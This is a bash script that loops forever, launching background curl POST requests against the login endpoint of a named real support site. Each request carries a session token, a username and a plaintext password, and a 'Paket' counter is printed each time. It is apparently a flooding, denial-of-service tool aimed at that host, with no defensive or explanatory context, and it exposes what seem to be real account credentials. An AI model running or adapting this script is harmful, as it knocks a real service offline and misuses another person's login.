#!/bin/bash
i=0
while true
do
    curl 'https://btdestek.miateknoloji.com/app/Controller/Login?action=login' \
    -H 'sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
    -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H 'Accept: /' \
    -H 'Referer: https://btdestek.miateknoloji.com/login' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H 'sec-ch-ua-platform: "Linux"' \
    --data-raw '_token=83160e879436ea15b0669c14b163ba96&kullaniciAdi=omer.evren&parola=77Mtq-krpdw&hatirla=1' \
    --compressed &
    echo "Paket $i:"
    i=$((i+1))
done
